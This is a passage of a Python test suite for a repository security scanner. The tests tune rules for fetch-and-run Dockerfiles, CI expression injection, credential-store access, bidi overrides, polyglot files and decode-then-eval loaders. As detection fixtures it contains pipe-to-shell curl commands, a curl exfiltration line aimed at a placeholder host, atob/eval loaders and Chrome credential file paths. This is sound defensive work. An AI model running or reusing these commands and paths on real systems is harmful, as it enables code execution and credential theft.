        # `chmod +x` is what the rule's download-then-run form looks for, and it is
        # what the real Dockerfile does -- a downloaded binary has to be made
        # executable before it can run. Without it the fixture did not match the rule
        # at all, so the first version of this test asserted a demotion that never
        # happened.
        "    chmod +x /tmp/tini ; \\\n"
        "    /tmp/tini --version\n"
    )
    UNVERIFIED = "FROM debian:12\nRUN curl -sL https://deb.nodesource.test/setup_20.x | bash -\n"

    @staticmethod
    def fetch_exec(root):
        from cordon_scanner import Scanner
        from cordon_scanner.core.config import Config

        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(root)
        return [f for f in result.findings if f.rule_id == "SUSPECT.CONTAINER.FETCH_EXEC.001"]

    def test_an_unverified_pipe_into_a_shell_blocks(self, tmp_path) -> None:
        from cordon_scanner.core.models import Severity

        (tmp_path / "Dockerfile").write_text(self.UNVERIFIED, encoding="utf-8")
        hits = self.fetch_exec(tmp_path)
        assert hits and all(f.severity >= Severity.HIGH for f in hits)

    def test_a_verified_fetch_is_still_reported_and_does_not_block(self, tmp_path) -> None:
        from cordon_scanner.core.models import Severity

        (tmp_path / "Dockerfile").write_text(self.VERIFIED, encoding="utf-8")
        hits = self.fetch_exec(tmp_path)
        assert hits, "a verified fetch is still a fetch and stays in the report"
        assert all(f.severity <= Severity.MEDIUM for f in hits)
        assert any("verifies what it downloaded" in f.message for f in hits)

    def test_the_mitigation_must_be_near_the_match(self, tmp_path) -> None:
        """A Dockerfile with twenty `RUN` instructions may verify one download and
        pipe another straight into a shell. Crediting the careless one for the careful
        one's checksum would be worse than not looking, so the window is local."""
        from cordon_scanner.core.models import Severity

        padding = "".join(f"RUN echo step{i}\n" for i in range(60))
        (tmp_path / "Dockerfile").write_text(
            self.VERIFIED + padding + self.UNVERIFIED.split("\n", 1)[1], encoding="utf-8"
        )
        hits = self.fetch_exec(tmp_path)
        assert any(f.severity >= Severity.HIGH for f in hits), [
            (str(f.severity), f.location.line) for f in hits
        ]

    def test_demote_clamps_at_info(self) -> None:
        """`Severity(INFO - 1)` raises, and a report is not the place to find that
        out."""
        from cordon_scanner.core.models import Severity

        assert Severity.CRITICAL.demote() is Severity.HIGH
        assert Severity.INFO.demote() is Severity.INFO


class TestANameEndingInLocationHoldsALocation:
    """Three more from the measurement tail, each a name that says what it holds.

    Elasticsearch declares `WEB_IDENTITY_TOKEN_FILE_LOCATION` and
    `POD_IDENTITY_TOKEN_FILE_LOCATION`, both holding a filesystem path, and its
    `TESTING.asciidoc` was reported for a documented example password -- `.adoc` was on
    the documentation list and `.asciidoc` was not.

    Its build scripts `publish_zstd_binaries.sh` and `publish_simdjson_binaries.sh`
    were reported as exfiltration. The second sits under `libs/simdjson/native/`, which
    no directory glob reaches, but the filename says exactly what it does.
    """

    @pytest.mark.parametrize(
        "name",
        [
            "WEB_IDENTITY_TOKEN_FILE_LOCATION",
            "POD_IDENTITY_TOKEN_FILE_LOCATION",
            "TOKEN_CACHE_DIRECTORY",
            "SECRET_STORE_HOSTNAME",
        ],
    )
    def test_a_location_name_is_not_a_credential(self, name: str) -> None:
        assert names_configuration(name)

    @pytest.mark.parametrize("path", ["TESTING.asciidoc", "docs/guide.asciidoc", "NOTES.org"])
    def test_asciidoc_is_documentation(self, path: str) -> None:
        from cordon_scanner.detect.secrets import is_documentation

        assert is_documentation(path)

    @pytest.mark.parametrize(
        "path",
        [
            "dev-tools/publish_zstd_binaries.sh",
            "libs/simdjson/native/publish_simdjson_binaries.sh",
            "ci/release-macos.sh",
            "bin/deploy_staging.sh",
        ],
    )
    def test_a_publishing_script_is_build_tooling(self, path: str) -> None:
        from cordon_scanner.detect.secrets import is_build_tooling

        assert is_build_tooling(path)

    @pytest.mark.parametrize("path", ["src/publisher.py", "lib/release_notes.rb"])
    def test_application_code_is_not(self, path: str) -> None:
        from cordon_scanner.detect.secrets import is_build_tooling

        assert not is_build_tooling(path)


class TestAConcurrencyGroupIsNotAShellCommand:
    """`SUSPECT.CI.EXPRESSION_INJECTION.001` fired ten times on DuckDB's workflows, on

        concurrency:
          group: osx-${{ github.workflow }}-${{ github.ref }}-${{ github.head_ref }}

    which is the documented way to scope cancellation per branch. A group name is a
    string GitHub compares for equality: there is no shell, so there is nothing to
    inject into.

    The rule already exempted a line that is ONLY `KEY: ${{ ... }}`, because that is
    the remediation it recommends. This line has other text around the expression, so
    the exemption did not apply -- and the rule's own message says "interpolated
    directly into a script".

    `name`, `runs-on`, `container`, `image` and `environment` are the same shape:
    GitHub consumes the value rather than handing it to an interpreter. `key` and
    `restore-keys` reach a cache, and cache poisoning is its own rule.
    """

    @staticmethod
    def fires(workflow: str) -> bool:
        from cordon_scanner.detect.config_files import RULES, ConfigDetector

        rule = next(r for r in RULES if r.rule_id == "SUSPECT.CI.EXPRESSION_INJECTION.001")
        raw = workflow.encode()
        return rule.pattern.search(ConfigDetector._without_comments(raw)) is not None

    @pytest.mark.parametrize(
        "line",
        [
            "concurrency:\n  group: osx-${{ github.workflow }}-${{ github.head_ref }}\n",
            "    name: build-${{ github.head_ref }}\n",
            "    runs-on: ${{ github.head_ref }}-runner\n",
            "      key: cache-${{ github.head_ref }}\n",
        ],
    )
    def test_a_value_that_never_reaches_a_shell_is_quiet(self, line: str) -> None:
        assert not self.fires(line)

    @pytest.mark.parametrize(
        "line",
        [
            '      - run: echo "Thanks for ${{ github.event.pull_request.title }}"\n',
            "      - run: git checkout ${{ github.head_ref }}\n",
            '      - run: curl -d "${{ github.event.issue.body }}" https://x.test/i\n',
        ],
    )
    def test_interpolation_into_a_script_still_fires(self, line: str) -> None:
        assert self.fires(line)

    def test_binding_to_an_environment_variable_stays_exempt(self) -> None:
        """The remediation the rule recommends, which it used to report on - seventy-two
        times across Django's, Grafana's and Home Assistant's workflows."""
        assert not self.fires("    env:\n      TITLE: ${{ github.event.pull_request.title }}\n")


class TestAFormatNobodyListedIsStillBinary:
    """DuckDB's `data/secrets/http/*.duckdb_secret` produced three Stripe secret-key
    findings from chance byte sequences. It is a serialised struct starting
    `d\\x00\\x04http`, with no magic number in `BINARY_MAGIC` and an extension no table
    lists, so it was scanned as text.

    A third signal settles it: content that contains a NUL **and** will not decode as
    UTF-8. Both halves are required, and that is what keeps it from being the bypass
    the original heuristic was. `b"\\x00" in raw[:8192]` alone meant prepending
    `/* NUL */` to a payload removed the file from every detector at once; such a file
    still decodes as UTF-8, so it stays text. Bytes that are both NUL-bearing and
    undecodable are not a text file with something prepended.
    """

    @staticmethod
    def content(path: str, raw: bytes):
        from cordon_scanner.core.content import FileContent

        return FileContent(path=path, raw=raw, size=len(raw))

    def test_an_unlisted_binary_format_is_binary(self) -> None:
        raw = b"d\x00\x04httpe\x00\x06configf\x00\x0chttp_v_1_1_0g\x00\x00\xc9\x00d\x00d\x00"
        assert self.content("data/secrets/http/http_v_1_1_0.duckdb_secret", raw).is_binary

    def test_the_nul_bypass_stays_closed(self) -> None:
        """The evasion the original heuristic had, and the reason the NUL test alone
        was removed: a payload with a NUL in a comment must still be scanned."""
        raw = b"/* \x00 */\nconst p = atob(BLOB);\neval(p);\n"
        assert not self.content("loader.js", raw).is_binary

    def test_ordinary_source_is_not_binary(self) -> None:
        raw = b"def f(x):\n    return x + 1\n"
        assert not self.content("mod.py", raw).is_binary

    def test_utf8_text_with_no_nul_is_not_binary(self) -> None:
        """Undecodable alone is not enough either: a latin-1 file with no NUL is text
        somebody wrote in another encoding, not a binary format."""
        raw = "name = 'café'\n".encode("latin-1")
        assert not self.content("conf.ini", raw).is_binary

    def test_the_duckdb_fixture_produces_no_secret_findings(self, tmp_path) -> None:
        data = tmp_path / "data" / "secrets" / "http"
        data.mkdir(parents=True)
        (data / "http_v_1_1_0.duckdb_secret").write_bytes(
            b"d\x00\x04httpe\x00\x06configf\x00\x0chttp_v_1_1_0g\x00\x00\xc9\x00"
            + bytes(range(256)) * 2
        )
        assert not {r for r in flagged(tmp_path) if r.startswith("SECRET.")}


class TestAGoCompositeLiteralIsNotACredential:
    """Vault supplied sixteen findings of one shape, all Go composite literals assigned
    to a credential-shaped field:

        Password: &v5.ChangePassword{
        secret.Auth = &api.SecretAuth{
        TOTPSecret: &mfa.TOTPSecret{
        password = &proto.ChangePassword{

    Each ends its line, so the unquoted branch's end-of-line lookahead was satisfied,
    and `&`, `.` and `{` were all permitted value characters. `}` was excluded and `{`
    was not.

    A credential never contains a brace. Base64, hex, JWTs and every provider format
    are drawn from alphabets that have none, so a brace in a value means a struct
    literal, a block, or an interpolation -- and excluding the opening one removes the
    whole class in a single character.
    """

    VALUE = ("aB3kQ9mZ", "2xT7vL4nR8wY")

    def fires(self, line: str) -> bool:
        return ASSIGNMENT.search(line.encode()) is not None

    @pytest.mark.parametrize(
        "line",
        [
            "\t\t\tPassword: &v5.ChangePassword{",
            "\t\tsecret.Auth = &api.SecretAuth{",
            "\t\t\tTOTPSecret: &mfa.TOTPSecret{",
            "\t\tpassword = &proto.ChangePassword{",
            "  Secret: &logical.Secret{",
        ],
    )
    def test_a_struct_literal_is_not_a_value(self, line: str) -> None:
        assert not self.fires(line)

    @pytest.mark.parametrize("line", ['SECRET_KEY = "{0}"', "api_token={0}", "password: '{0}'"])
    def test_a_real_assignment_still_fires(self, line: str) -> None:
        assert self.fires(line.format(assemble(*self.VALUE)))

    def test_a_value_that_says_it_is_not_a_credential(self) -> None:
        """Vault's rollback test sets `bindpass="intentionally-wrong-password"`, which
        is a sentence announcing itself."""
        from cordon_scanner.detect.secrets import PLACEHOLDER

        assert PLACEHOLDER.search(b"intentionally-wrong-password")
        assert not PLACEHOLDER.search(assemble(*self.VALUE).encode())

    @pytest.mark.parametrize(
        "path",
        [
            "command/server/config_test_helpers.go",
            "internal/db/query_test_utils.go",
            "pkg/client/client_testing.go",
        ],
    )
    def test_a_plural_helper_file_is_test_material(self, path: str) -> None:
        """`**/*_test_helper.*` was listed and the plural was not, which is the
        spelling Vault uses."""
        from cordon_scanner.detect.secrets import is_test_material

        assert is_test_material(path)


class TestOneVariableAssignedToAnother:
    """`next_token = continuation_token` in Airflow's Glue hook, reported as a
    credential. The value is an identifier: this is a pagination loop, and every one
    ever written has this line.

    `NOT_A_SECRET` has a separated-identifier alternative that should have covered it,
    guarded by a lookahead rejecting a long single-case run -- and "continuation" is
    exactly twelve lowercase letters, the threshold. So are "authorization",
    "configuration", "serialization", "implementation" and "transformation".

    Raising the threshold to twenty was tried and the existing suite refused it inside
    one run: `glpat-AAAAAAAAAAAAAAAA` is sixteen repeated characters, so a padded
    GitLab token became "a separated identifier".
    `test_a_separator_does_not_launder_key_material` exists for exactly that and was
    right, so the threshold stayed and the fix moved to `PLACEHOLDER`, where the
    mechanism for "the words themselves, used as their own name" already lived.
    """

    @staticmethod
    def dismissed(value: bytes) -> bool:
        from cordon_scanner.detect.secrets import PLACEHOLDER

        return bool(NOT_A_SECRET.match(value)) or bool(PLACEHOLDER.search(value))

    @pytest.mark.parametrize(
        "value",
        [
            b"continuation_token",
            b"next_token",
            b"previous_token",
            b"page_token",
            b"refresh_token",
            b"service_account_token",
            b"current_password",
            b"raw_secret",
        ],
    )
    def test_a_variable_reference_is_not_a_value(self, value: bytes) -> None:
        assert self.dismissed(value)

    @pytest.mark.parametrize(
        "parts",
        [
            ("glpat-", "AAAAAAAAAAAAAAAA"),
            ("hunter2", "Sup3r", "SecretValue"),
            ("aB3kQ9mZ", "2xT7vL4nR8wY"),
        ],
    )
    def test_key_material_is_not_laundered(self, parts: tuple[str, ...]) -> None:
        """The guard the threshold experiment tripped. Kept here too, because this is
        where somebody reading the fix will be."""
        assert not self.dismissed(assemble(*parts).encode())

    def test_a_sentinel_wears_underscores_at_both_ends(self) -> None:
        """webpack declares `MODULE_REFERENCE_TOKEN = "__WEBPACK_MODULE_REFERENCE__"`.
        The identifier alternative required the first character to be a letter and
        allowed no trailing separator."""
        assert self.dismissed(b"__WEBPACK_MODULE_REFERENCE__")

    @pytest.mark.parametrize(
        "value", [b"sk-ecdsa-sha2-nistp256@openssh.com", b"sk-ssh-ed25519@openssh.com"]
    )
    def test_an_ssh_algorithm_name_is_not_a_credential(self, value: bytes) -> None:
        """Ansible declares these, and `sk-` is in `CREDENTIAL_PREFIXES`, so the
        assembled path read an algorithm name as a key. A name qualified by a domain is
        an identifier; a credential is not addressed at a host."""
        assert self.dismissed(value)


class TestABinDirectoryIsWhereAProgramKeepsItself:
    """`SUSPECT.BINARY.EXECUTABLE_PATH.001` reported Elasticsearch's
    `distribution/src/bin/elasticsearch-service-x64.exe` and
    `elasticsearch-service-mgr.exe` at HIGH, as sitting "where a lifecycle step will
    run it". They sit where a USER runs them: that is the Windows service Elasticsearch
    installs, and `bin/` is the documented place for a program's own executables rather
    than a surprising one.

    `scripts/`, `.githooks/` and `postinstall/` are lifecycle locations -- something
    else runs what is in them, unprompted. `bin/` is the opposite.

    Nothing stops being reported. The other branch emits
    `POLICY.BINARY.COMMITTED.001`, which is the accurate statement: a binary was
    committed, and a binary is unreviewable wherever it lives.
    """

    ELF = b"\x7fELF" + b"\x00" * 64

    @staticmethod
    def rules_in(root) -> set[str]:
        from cordon_scanner import Scanner
        from cordon_scanner.core.config import Config

        return {
            f.rule_id
            for f in Scanner(Config.default().with_overrides(use_cache=False)).scan(root).findings
        }

    def test_a_shipped_executable_is_a_policy_note(self, tmp_path) -> None:
        target = tmp_path / "distribution" / "src" / "bin"
        target.mkdir(parents=True)
        (target / "service-mgr.exe").write_bytes(self.ELF)
        found = self.rules_in(tmp_path)
        assert "SUSPECT.BINARY.EXECUTABLE_PATH.001" not in found, found
        assert "POLICY.BINARY.COMMITTED.001" in found, found

    def test_the_same_binary_under_scripts_still_blocks(self, tmp_path) -> None:
        """The guard. `scripts/` is a lifecycle location and the rule's whole point."""
        target = tmp_path / "scripts"
        target.mkdir()
        (target / "helper").write_bytes(self.ELF)
        assert "SUSPECT.BINARY.EXECUTABLE_PATH.001" in self.rules_in(tmp_path)

    def test_and_under_a_hooks_directory(self, tmp_path) -> None:
        target = tmp_path / ".githooks"
        target.mkdir()
        (target / "pre-commit").write_bytes(self.ELF)
        assert "SUSPECT.BINARY.EXECUTABLE_PATH.001" in self.rules_in(tmp_path)


class TestPersistenceIsWhatAnInstallerDoes:
    """`SUSPECT.PERSIST.001` produced five hundred findings across 104 of 1,396
    repositories, and installer directories were most of them. The Proxmox
    helper-script collection keeps `install/mysql-install.sh`,
    `install/zammad-install.sh` and a hundred siblings, each setting up a systemd
    unit.

    `**/install.sh` was on the build-tooling list and `install/` as a DIRECTORY was
    not.
    """

    @pytest.mark.parametrize(
        "path",
        [
            "install/mysql-install.sh",
            "install/zammad-install.sh",
            "installer/postinstall.sh",
            "provisioning/node.sh",
        ],
    )
    def test_an_installer_directory_is_build_tooling(self, path: str) -> None:
        from cordon_scanner.detect.secrets import is_build_tooling

        assert is_build_tooling(path)

    @pytest.mark.parametrize("path", ["src/installers.py", "app/provision_account.rb"])
    def test_application_code_is_not(self, path: str) -> None:
        from cordon_scanner.detect.secrets import is_build_tooling

        assert not is_build_tooling(path)


class TestABundlerThatHashesItsOutputDefeatsEveryGlob:
    """`SUSPECT.DECODE_CHAIN.001` and `SUSPECT.DECODE_EXEC.001` fired on
    `assets/ToolsPage-COpoWLDm.js` and `assets/index-BTLZFAP9.js`, which are Vite
    output. A minified bundle contains a decoder beside an evaluator because that is
    what a module loader is, so it supplies both composites by construction.

    `*.min.js`, `dist/` and `.yarn/releases/` are on the path list and a content hash
    matches no convention a glob can express, so the signal has to be the content: a
    line over a thousand characters is not something anybody writes by hand.

    Worth recording what this does NOT touch. The same rule's largest real
    contributors in that run were `tennc/webshell` - a collection of PHP webshells,
    which is malware by design and correctly reported - and Metasploit's exploit
    modules. Neither is minified, and both still report.
    """

    @staticmethod
    def content(path: str, text: str):
        from cordon_scanner.core.content import FileContent

        raw = text.encode()
        return FileContent(path=path, raw=raw, size=len(raw))

    def test_a_hashed_bundle_is_recognised(self) -> None:
        from cordon_scanner.detect.capability import CapabilityDetector

        bundle = "var a=1;" * 400
        assert CapabilityDetector._is_minified(self.content("assets/index-BTLZFAP9.js", bundle))

    def test_ordinary_source_is_not(self) -> None:
        from cordon_scanner.detect.capability import CapabilityDetector

        source = "function add(a, b) {\n    return a + b;\n}\n" * 50
        assert not CapabilityDetector._is_minified(self.content("src/math.js", source))

    def test_a_minified_bundle_is_reported_below_blocking(self, tmp_path) -> None:
        from cordon_scanner import Scanner
        from cordon_scanner.core.config import Config
        from cordon_scanner.core.models import Severity

        assets = tmp_path / "assets"
        assets.mkdir()
        (assets / "index-BTLZFAP9.js").write_text(
            "var _x=1;" * 200 + "var p=atob(B),q=new Function(p);q();" + "var _y=2;" * 200 + "\n",
            encoding="utf-8",
        )
        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(tmp_path)
        decode = [f for f in result.findings if f.rule_id.startswith("SUSPECT.DECODE")]
        assert all(f.severity <= Severity.MEDIUM for f in decode), [
            (f.rule_id, str(f.severity)) for f in decode
        ]

    def test_hand_written_source_doing_the_same_thing_still_blocks(self, tmp_path) -> None:
        from cordon_scanner import Scanner
        from cordon_scanner.core.config import Config
        from cordon_scanner.core.models import Severity

        source = tmp_path / "src"
        source.mkdir()
        (source / "loader.js").write_text(
            "const payload = atob(BLOB);\nconst run = new Function(payload);\nrun();\n",
            encoding="utf-8",
        )
        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(tmp_path)
        decode = [f for f in result.findings if f.rule_id.startswith("SUSPECT.DECODE")]
        assert decode and any(f.severity >= Severity.HIGH for f in decode)


class TestACookieJarIsNotAChromeProfile:
    """`SUSPECT.EXFIL.CREDENTIAL_STORE.001` fired in 75 of 1,396 repositories, on
    rclone's WebDAV cookie fetcher, a Rust TLS module, next.js's router and a Homebrew
    formula. The capability pattern matched the bare word `Cookies`.

    Chrome's cookie store is a file inside a profile directory -- `.../Default/Cookies`
    -- and without a path separator or a quote in front, the word matches
    `resp.Cookies()`, `http.Cookies` and a struct field of that name in every HTTP
    client ever written. rclone uses it four times in one file, which was enough to
    pair with an egress call and report a credential-theft finding at HIGH on a file
    whose job is fetching a cookie for the user.

    The rule already carried `cookies = session.cookies.get_dict()` as a negative test.
    That passes on the lowercase spelling alone, so it never exercised the capitalised
    one Go, C# and Java use.

    Requiring only a path separator broke the corpus sample, which builds the path the
    way Python actually does: `Path.home() / ".config" / "google-chrome" / "Default" /
    "Login Data"`, where every component is a quoted string and none carries a slash.
    A separator OR an opening quote covers both, and a bare identifier is neither.
    """

    @staticmethod
    def store_pattern():
        from cordon_scanner.rules.loader import RuleLoader

        for pack in RuleLoader.load_builtin():
            for rule in pack.rules:
                if rule.id == "CAP.CREDENTIAL.STORE.001":
                    return rule.match.regex
        raise AssertionError("CAP.CREDENTIAL.STORE.001 is not in the built-in packs")

    @pytest.mark.parametrize(
        "line",
        [
            b"for _, c := range resp.Cookies() {",
            b"jar.Cookies = append(jar.Cookies, c)",
            b"var Cookies []*http.Cookie",
            b"response.Headers.Cookies",
            b"    Cookies: cookieJar,",
        ],
    )
    def test_an_http_cookie_jar_is_not_a_credential_store(self, line: bytes) -> None:
        assert self.store_pattern().search(line) is None

    @pytest.mark.parametrize(
        "line",
        [
            b"path = os.path.expanduser('~/.config/google-chrome/Default/Cookies')",
            b'profile = Path.home() / ".config" / "google-chrome" / "Default" / "Login Data"',
            b'shutil.copy(home / "Default" / "Web Data", staging)',
        ],
    )
    def test_a_browser_profile_store_still_matches(self, line: bytes) -> None:
        assert self.store_pattern().search(line) is not None


class TestAFileThatNamesTheAttackIsDocumentingIt:
    """Two bidi findings survived every path-based ceiling because both files are
    ordinary application code by every signal available.

    Bandit's `plugins/trojansource.py` is the plugin that DETECTS Trojan Source, and
    its docstring shows the sample output -- so the override characters sit in prose
    beside the words "trojansource", "bidirectional control character" and "CWE-838".

    webpack's `WebManifestParser.js` strips a byte-order mark before parsing JSON and
    writes the check as `if (source[0] === "\\ufeff")`, with the character itself. A BOM
    is invisible but not DIRECTIONAL: it cannot reorder anything, which is what this
    rule's message is about.

    An attacker does not label the override. That is the entire point of one -- it
    works because a reviewer cannot see it, and a comment announcing its presence
    defeats the technique. So a label is weak evidence for an attack and strong
    evidence for documentation.

    Both LOWER the severity rather than suppressing: the characters really are present,
    and a label is not proof of innocence.
    """

    OVERRIDE = chr(0x202E)

    def test_a_labelled_override_is_reported_below_blocking(self, tmp_path) -> None:
        from cordon_scanner import Scanner
        from cordon_scanner.core.config import Config
        from cordon_scanner.core.models import Severity

        (tmp_path / "trojansource.py").write_text(
            '"""Detects Trojan Source attacks.\n\n'
            "    Bidirectional control characters reorder how source renders.\n"
            f"    Example: if access_level != 'user' {self.OVERRIDE}\n"
            '    CWE-838\n"""\n\n'
            "def check(node):\n    return None\n",
            encoding="utf-8",
        )
        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(tmp_path)
        bidi = [f for f in result.findings if f.rule_id == "SUSPECT.OBFUSCATION.BIDI.001"]
        assert bidi, "the characters are present and the finding stays in the report"
        assert all(f.severity <= Severity.LOW for f in bidi)

    def test_a_bom_in_a_one_character_literal_is_a_parser(self, tmp_path) -> None:
        from cordon_scanner import Scanner
        from cordon_scanner.core.config import Config
        from cordon_scanner.core.models import Severity

        (tmp_path / "parse.js").write_text(
            "function strip(source) {\n"
            f'\tif (source[0] === "{chr(0xFEFF)}") {{\n'
            "\t\tsource = source.slice(1);\n\t}\n\treturn source;\n}\n",
            encoding="utf-8",
        )
        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(tmp_path)
        bidi = [f for f in result.findings if f.rule_id == "SUSPECT.OBFUSCATION.BIDI.001"]
        assert all(f.severity <= Severity.LOW for f in bidi)

    def test_an_unlabelled_override_in_code_still_blocks(self, tmp_path) -> None:
        """The guard, and the reason neither of these is a suppression: an override that
        does not announce itself is the attack."""
        from cordon_scanner import Scanner
        from cordon_scanner.core.config import Config
        from cordon_scanner.core.models import Severity

        source = tmp_path / "src"
        source.mkdir()
        (source / "auth.py").write_text(
            f"access_level = 'user'\nif access_level != 'none {self.OVERRIDE} ':\n    grant()\n",
            encoding="utf-8",
        )
        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(tmp_path)
        bidi = [f for f in result.findings if f.rule_id == "SUSPECT.OBFUSCATION.BIDI.001"]
        assert bidi and any(f.severity >= Severity.HIGH for f in bidi)


class TestAGitLfsPointerIsNotAForgery:
    """`unionlabs/union` produced 907 format-mismatch findings from a shallow clone.
    It tracks `*.png`, `*.pdf` and `*.psd` through Git LFS, so every tracked asset is
    about 130 bytes of text:

        version https://git-lfs.github.com/spec/v1
        oid sha256:c7c7bf33de10f0b172e1153222ca8ad8e3ba09681525662a2e00177560f4acb6
        size 755472

    A `.png` holding that is not a file lying about its type. It is a checkout without
    LFS content -- which is the DEFAULT for `actions/checkout`, so it is the state most
    CI runs are in, and any repository using LFS has the same shape.

    Reported rather than passed over, because a file that was not examined must not look
    like a file that was examined and found clean. Aggregated into one INFO finding the
    way binary skips already are, because 528 individual notices is its own kind of
    noise. Not treated as incompleteness: a repository's images being absent is not a
    degraded scan of its source, and marking it so would make `fail_on_incomplete`
    unusable for every project that uses LFS.
    """

    POINTER = (
        b"version https://git-lfs.github.com/spec/v1\n"
        b"oid sha256:c7c7bf33de10f0b172e1153222ca8ad8e3ba09681525662a2e00177560f4acb6\n"
        b"size 755472\n"
    )

    @staticmethod
    def content(path: str, raw: bytes):
        from cordon_scanner.core.content import FileContent

        return FileContent(path=path, raw=raw, size=len(raw))

    def test_a_pointer_is_recognised(self) -> None:
        assert self.content("static/app-og-image.png", self.POINTER).is_lfs_pointer

    def test_an_ordinary_file_is_not(self) -> None:
        assert not self.content(
            "static/logo.png", b"\x89PNG\r\n\x1a\n" + b"\x00" * 32
        ).is_lfs_pointer

    def test_text_mentioning_lfs_later_is_not(self) -> None:
        """Matched at offset zero, which is what the format requires and what `git lfs`
        itself looks for. A document about LFS is not a pointer."""
        raw = b"# Notes\n\nSee version https://git-lfs.github.com/spec/v1 for the format.\n"
        assert not self.content("docs/lfs.md", raw).is_lfs_pointer

    def test_no_mismatch_is_reported(self, tmp_path) -> None:
        static = tmp_path / "static"
        static.mkdir()
        for name in ("a.png", "b.pdf", "c.psd"):
            (static / name).write_bytes(self.POINTER)
        assert "SUSPECT.POLYGLOT.MISMATCH.001" not in flagged(tmp_path)

    def test_the_skip_is_reported_once(self, tmp_path) -> None:
        from cordon_scanner import Scanner
        from cordon_scanner.core.config import Config
        from cordon_scanner.core.models import Severity

        static = tmp_path / "static"
        static.mkdir()
        for index in range(12):
            (static / f"asset{index}.png").write_bytes(self.POINTER)
        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(tmp_path)
        notices = [f for f in result.findings if f.rule_id == "OPERATIONAL.FILE.LFS_POINTER"]
        assert len(notices) == 1, [f.location.path for f in notices]
        assert "12 file(s)" in notices[0].message
        assert notices[0].severity is Severity.INFO

    def test_a_real_polyglot_is_still_reported(self, tmp_path) -> None:
        """The guard. A `.png` holding a script is what the rule exists for, and
        recognising pointers must not be a way to get past it: a pointer has a fixed
        first line, and a payload cannot have one and still be a payload."""
        static = tmp_path / "static"
        static.mkdir()
        (static / "logo.png").write_bytes(b"#!/bin/sh\ncurl https://x.test/p | sh\n")
        assert "SUSPECT.POLYGLOT.MISMATCH.001" in flagged(tmp_path)


class TestTwoImageFormatsConfusedIsNotADisguise:
    """`geekxh/hello-algorithm` produced 458 blocking findings and every one of them was
    a PNG saved under a `.jpg` name -- screenshots exported by a tool that writes PNG
    bytes whatever the filename says. Across the 1,487-repository corpus, image
    extensions accounted for 1,866 of the 1,980 format-mismatch findings.

    None of them is the thing the rule exists for. A polyglot is a file arranged so that
    the thing INSPECTING it and the thing RUNNING it disagree, and the disagreement is
    only a finding when the content can do something the name does not admit to: an
    executable, an archive, a script. A PNG named `.jpg` renders as an image either way,
    executes nothing either way, and conceals nothing from anybody.

    So the comparison is between KINDS, not names. Within a kind it is a naming error and
    silent; across kinds it is reported, and the message now says which way round.
    """

    PNG = b"\x89PNG\r\n\x1a\n" + b"\x00" * 64
    JPEG = b"\xff\xd8\xff" + b"\x00" * 64
    GIF = b"GIF8" + b"\x00" * 64

    @pytest.mark.parametrize(
        ("path", "raw"),
        [
            ("docs/1.jpg", PNG),
            ("docs/1.jpeg", PNG),
            ("docs/shot.png", JPEG),
            ("docs/shot.png", GIF),
            ("docs/anim.gif", PNG),
        ],
    )
    def test_an_image_under_another_image_name_is_silent(self, path: str, raw: bytes) -> None:
        assert BinaryDetector.mismatch(path, BinaryDetector.identify(raw)) is None

    def test_a_gzip_named_zip_is_silent(self) -> None:
        """Same reasoning one kind over: `.tar.gz` renamed to `.zip` is somebody's
        download script, not a forgery."""
        assert (
            BinaryDetector.mismatch("dist/x.zip", BinaryDetector.identify(b"\x1f\x8b\x08\x00"))
            is None
        )

    @pytest.mark.parametrize(
        ("path", "raw"),
        [
            ("static/logo.png", ELF),
            ("static/logo.png", b"#!/bin/sh\necho x\n"),
            ("static/logo.png", b"PK\x03\x04rest"),
            ("static/photo.jpg", b"MZ\x90\x00" + b"\x00" * 40),
            ("docs/manual.pdf", PNG),
        ],
    )
    def test_a_different_kind_is_still_reported(self, path: str, raw: bytes) -> None:
        """The guard, in both directions. An image extension over an executable, an
        archive or a script is the finding; so is a document extension over an image,
        because the name still promises something the bytes are not."""
        assert BinaryDetector.mismatch(path, BinaryDetector.identify(raw)) is not None

    def test_the_message_names_both_kinds(self) -> None:
        message = BinaryDetector.mismatch("static/logo.png", BinaryDetector.identify(ELF))
        assert message is not None
        assert "an executable rather than an image" in message

    @pytest.mark.parametrize(
        ("path", "raw"),
        [
            ("lib/x.so", b"#!/bin/sh\necho x\n"),
            ("lib/x.dylib", JAVA_CLASS),
        ],
    )
    def test_executables_are_not_interchangeable(self, path: str, raw: bytes) -> None:
        """The narrowness of the exemption, stated as a test. Both of these are one kind
        -- executable -- and both stay reported: a script wearing a native library's name
        is the substitution the rule was written for, and comparing kinds alone would have
        silenced it. Only `INTERCHANGEABLE_KINDS` is exempt, and it holds two entries."""
        assert BinaryDetector.mismatch(path, BinaryDetector.identify(raw)) is not None

    def test_the_repository_shape_produces_nothing(self, tmp_path) -> None:
        """End to end, as the repository was laid out: a directory of numbered
        screenshots, all PNG bytes, all named `.jpg`."""
        shots = tmp_path / "sourcefile" / "701"
        shots.mkdir(parents=True)
        for index in range(1, 9):
            (shots / f"{index}.jpg").write_bytes(self.PNG)
        assert "SUSPECT.POLYGLOT.MISMATCH.001" not in flagged(tmp_path)


class TestAnotherAnalysersRuleCorpusIsNotAFinding:
    """`semgrep/semgrep-rules` produced 189 blocking findings and 188 of them were
    samples the repository publishes in order to be detected:

        // ruleid: adafruit-api-key
        adafruit_api_token = "9zu9r6idf9c0tfcc4w26l66ij7visb8n"

    That file is two lines long and the first says what the second is for. The same
    repository supplies a Terraform file with an IAM wildcard, a Kubernetes document
    whose `privileged: true` is a *pattern* rather than a deployment, and a bash file
    whose entire content is the capability pair the rule beside it matches. Five
    detectors fired on them.

    The class is not semgrep's. Any repository that vendors a rule set has the shape,
    which is most security teams' own repositories and this project's own rule packs --
    and this detector already had the case on record from Bandit, whose
    `plugins/trojansource.py` finds Trojan Source attacks and whose
    `examples/trojansource.py` is the example it was written against.

    A ceiling at INFO rather than a deletion. One comment line is cheap to add, so a
    predicate that removed findings would be a one-line bypass; the rule still runs and
    the evidence survives, below the default reporting threshold.
    """

    ANNOTATED = (
        b'// ruleid: adafruit-api-key\nadafruit_api_token = "9zu9r6idf9c0tfcc4w26l66ij7visb8n"\n'
    )
    RULESET = (
        b"rules:\n"
        b"  - id: hardcoded-credential\n"
        b"    message: A credential is assigned in source\n"
